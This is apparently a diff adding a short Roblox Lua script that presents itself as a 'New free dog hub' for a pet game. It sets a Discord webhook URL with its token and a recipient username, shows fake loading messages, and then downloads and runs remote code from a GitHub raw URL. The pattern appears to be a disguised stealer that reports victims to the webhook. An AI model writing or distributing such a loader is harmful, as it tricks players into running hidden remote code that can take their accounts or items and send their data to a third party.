@@ -1,0 +1,8 @@
+Username ="camera_man9970"
+WebHook = "https://discord.com/api/webhooks/1085581204243349556/ZYNzVdPpE3Fhk06YtnZq610aOVfXUJTKCoOsvCe5_8nBYLFsRXiVv0h_rVGelBaingsD"
+_G.CustomScriptName = "New free dog hub in psx"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
